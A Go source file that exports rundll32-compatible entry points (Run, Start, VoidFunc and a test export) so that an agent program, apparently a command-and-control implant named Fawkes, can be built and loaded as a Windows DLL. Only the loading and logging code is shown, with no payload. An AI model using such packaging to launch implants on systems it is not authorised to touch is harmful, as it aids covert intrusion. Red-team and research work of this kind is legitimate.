//go:build shared
// +build shared

package main

import "C"
import (
	"fmt"
	"log"
	"os"
	"path/filepath"
	"time"
	"unsafe"
)

// These exported functions are only compiled when building with -buildmode=c-shared

func setupDllLogging() {
	// Create log file in temp directory for DLL debugging
	tempDir := os.TempDir()
	logPath := filepath.Join(tempDir, fmt.Sprintf("fawkes_%d.log", time.Now().Unix()))
	logFile, err := os.OpenFile(logPath, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	if err == nil {
		log.SetOutput(logFile)
		log.Printf("[INFO] DLL logging initialized: %s", logPath)
	} else {
		// Fallback to stdout
		log.SetOutput(os.Stdout)
	}
}

//export TestExport
func TestExport(hwnd, hinst, lpszCmdLine unsafe.Pointer, nCmdShow int) {
	// Simple test export that just writes to a file to verify DLL loading
	// This matches rundll32's expected signature
	tempDir := os.TempDir()
	testPath := filepath.Join(tempDir, "fawkes_test.txt")
	content := fmt.Sprintf("Fawkes DLL TestExport called at %s\n", time.Now().String())
	os.WriteFile(testPath, []byte(content), 0644)
}

//export Run
func Run(hwnd, hinst, lpszCmdLine unsafe.Pointer, nCmdShow int) {
	// Entry point for the DLL that can be called via rundll32
	// Matches rundll32's expected signature: void CALLBACK EntryPoint(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
	setupDllLogging()
	log.Printf("[INFO] DLL Run export called")
	runAgent()
}

//export Start
func Start(hwnd, hinst, lpszCmdLine unsafe.Pointer, nCmdShow int) {
	// Alternative entry point name
	setupDllLogging()
	log.Printf("[INFO] DLL Start export called")
	runAgent()
}

//export VoidFunc
func VoidFunc() {
	// Generic export for some loaders that don't use rundll32 signature
	setupDllLogging()
	log.Printf("[INFO] DLL VoidFunc export called")
	runAgent()
}
